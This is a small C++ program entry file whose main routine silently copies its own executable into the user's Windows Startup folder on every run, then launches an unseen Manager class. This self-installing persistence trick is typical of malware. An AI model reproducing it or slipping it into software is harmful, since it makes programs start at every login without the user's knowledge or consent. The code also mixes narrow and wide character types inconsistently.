#include "Manager.h"

#include <windows.h>
#include <Lmcons.h>

#include <string>
#include <tchar.h>
#include <commdlg.h>

#ifdef _UNICODE
typedef std::wstring LCString;
template<class T>
LCString to_LCString(T arg)
{
	return std::to_wstring(arg);
}
#else
typedef std::string LCString;
template<class T>
LCString to_LCString(T arg)
{
	return std::to_string(arg);
}
#endif

void copyToStartUpDirectory()
{
	// Lets copy ourselves to startup directory.
	// Maybe, there is sense to do this each time so won't put any checks 
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::string m_username = username;

	LCString startupPath = LCString{ _T("C://Users//") };
	startupPath.append(m_username);
	startupPath.append(_T("//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//"));

	_TCHAR szFilepath[255];
	_TCHAR szFilename[255];
	_TCHAR szDestpath[255];
	//Get the current executable's path
	::GetModuleFileName(NULL, szFilepath, 255);
	//Get the current executable's file name
	::GetFileTitle(szFilepath, szFilename, 255);
	//Set the destination folder path
	strncpy_s(szDestpath, 255, startupPath.data(), startupPath.size());
	//Set the destination file path
	strncat_s(szDestpath, szFilename, strlen(szFilename));
	DeleteFile(szDestpath);
	//copy the file
	DWORD dwAttrib = GetFileAttributes(szDestpath);
	if (((dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY))))
	{
		DeleteFile(szDestpath);
	}
	CopyFile(szFilepath, szDestpath, FALSE);
}

int main()
{
	copyToStartUpDirectory();

	Manager manager;
	manager.exec();

	return 0;
}